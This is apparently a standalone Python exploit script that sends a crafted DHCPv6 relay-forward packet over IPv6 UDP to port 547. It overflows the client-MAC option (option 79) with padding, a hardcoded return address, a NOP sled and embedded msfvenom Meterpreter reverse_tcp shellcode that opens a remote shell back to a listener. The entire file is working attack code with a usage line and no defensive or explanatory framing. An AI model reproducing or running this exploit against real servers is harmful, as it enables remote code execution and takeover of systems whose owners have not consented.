#!/usr/bin/python

from struct import pack
import sys
import socket
import binascii

#usage : python3 exploit.py fe80::6784:87e7:b6eb:db99 547
#msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b "\x00\x0a\x0d\x20" -f python

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xf0\x69\x8f\x3d\xf0"
shellcode += b"\x76\x6b\x13\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\xc1\x96\xe5\x34\xa8\xef\xdd\x03\xb8"
shellcode += b"\xe0\x59\x70\xc1\xbf\x01\x31\xb1\x33\xe5\x3a\xaa"
shellcode += b"\x79\x6e\x5b\x75\xa9\xf7\x6c\x9a\x7c\x2a\x4a\xa0"
shellcode += b"\x03\xa6\x65\x69\x1c\x69\x4c\x9a\x68\xd1\x32\xf5"
shellcode += b"\x3e\xee\xd3\x88\x52\xc7\xaa\xb8\xcf\x69\x13\xf5"
shellcode += b"\x50\xf0\x3d\xf0\x77\x3a\x5b\x79\x8f\xe5\x2d\xaa"
shellcode += b"\x1c\x41\x4b\xff\x6c\xd6\x75\x75\xb6\x12\x36\xb9"
shellcode += b"\x96\x46\x49\xe8\x21\x01\x30\xa8\x03\x8f\x57\xf5"
shellcode += b"\x3e\xe2\xf4\xb8\x58\x79\x32\xf5\x2f\x32\x4c\xb8"
shellcode += b"\xec\x4f\x44\x37\x1c\x57\x4b\x9a\x68\xd0\x32\xf5"
shellcode += b"\x28\x01\x6d\xaa\x66\x8a\x75\x75\xb6\x13\xfe\x0f"
shellcode += b"\x8f\x8f\x3d\xf0\x76\x6b\x13"


def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, b"A"*50 + pack("<Q",0x000000000045269f) + b"\x90" *16 + shellcode),
    ])

    print("[+] Packer Header (38 bytes):")
    print(binascii.hexlify(pkg)[0:76])
    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))
